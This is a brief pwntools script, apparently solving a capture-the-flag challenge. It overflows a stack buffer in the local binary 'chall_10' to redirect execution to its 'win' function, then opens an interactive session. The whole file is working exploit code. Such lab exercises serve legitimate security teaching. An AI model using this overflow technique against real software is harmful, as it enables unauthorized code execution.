from pwn import *
p = process ("./chall_10")
context.arch = "i386" 
elf = ELF("./chall_10") 

p.sendline("junk")

payload = b''
payload += (0x3a-0x4) * b'A'
payload += p32(elf.sym.win)
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeef)

p.sendline(payload)
p.interactive()
ls